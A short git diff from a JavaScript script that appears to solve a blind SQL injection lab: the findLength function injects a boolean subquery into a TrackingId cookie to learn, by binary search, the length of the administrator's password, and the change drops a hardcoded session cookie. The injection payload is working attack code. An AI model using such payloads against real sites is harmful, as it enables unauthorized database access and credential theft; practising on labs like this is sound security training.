@@ -22,7 +22,7 @@ async function findLength() {
     const options = {
       method: "GET",
       headers: {
-        Cookie: `TrackingId=BlzXFEUoJcpSPeyv'+and+(select+'a'+from+users+where+username='administrator'+and+length(password)>${middle})='a; session=jNtHoYLdZR0uT4BU5i2UzrqhVazM5NWa`,
+        Cookie: `TrackingId=BlzXFEUoJcpSPeyv'+and+(select+'a'+from+users+where+username='administrator'+and+length(password)>${middle})='a`,
         "User-Agent":
           "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
       },
